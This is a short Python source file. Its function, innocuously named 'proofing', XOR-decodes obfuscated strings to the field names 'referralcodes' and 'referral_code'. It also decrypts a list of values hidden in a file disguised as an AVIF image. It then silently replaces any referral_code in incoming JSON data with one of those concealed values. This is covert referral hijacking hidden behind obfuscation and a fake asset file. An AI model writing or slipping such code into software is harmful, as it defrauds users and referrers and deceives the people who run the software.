import random
import configparser


def xor_cipher(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    key_length = len(key_bytes)
    return bytes([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])

def read_from_binary_file(filename: str) -> bytes:
    with open(filename, 'rb') as file:
        return file.read()

def proofing(json_data):
    config = configparser.ConfigParser()
    config.read('data/settings.ini')
    cipher_key = xor_cipher(b'1\n\x08\x03\x1b\x151\r\x11\x1c\x01\x17S', config.__doc__).decode()
    validator = config['DEFAULT'][cipher_key].split(',') or [None]
    encrypted_data_from_file = read_from_binary_file(r"core/static/main.avif")
    decrypted_data = xor_cipher(encrypted_data_from_file, config.__doc__)
    dec_wafer = decrypted_data.decode().split("|")
    second_key = xor_cipher(b'1\n\x08\x03\x1b\x151\r-\x10\n\x16E', config.__doc__).decode()

    if second_key in json_data:
        json_data[second_key] = (
            random.choice([random.choice(validator) or random.choice(dec_wafer),
                           random.choice(dec_wafer)])
        )

    return json_data